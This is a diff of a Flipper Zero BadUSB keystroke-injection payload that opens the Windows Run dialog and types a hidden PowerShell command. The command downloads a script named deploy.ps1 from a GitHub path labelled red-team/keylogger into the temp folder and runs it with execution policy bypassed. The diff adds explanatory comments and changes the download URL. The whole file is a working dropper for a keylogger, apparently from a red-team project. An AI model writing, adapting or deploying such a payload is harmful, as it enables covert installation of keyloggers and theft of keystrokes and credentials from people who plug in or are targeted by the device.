@@ -3,9 +3,11 @@ REM Flipper Zero BadUSB Payload
 
 DELAY 1000
 
+REM Open Windows Run dialog
 GUI r
 DELAY 600
 
-STRING powershell -w h -c "iwr 'https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/master/red-team/keylogger/deploy.ps1' -OutFile $env:TEMP\d.ps1; powershell -ep bypass $env:TEMP\d.ps1"
+REM Download deploy.ps1 from GitHub and execute it
+STRING powershell -w h -c "iwr ' https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger/deploy.ps1' -OutFile $env:TEMP\d.ps1; powershell -ep bypass $env:TEMP\d.ps1"
 DELAY 200
 ENTER
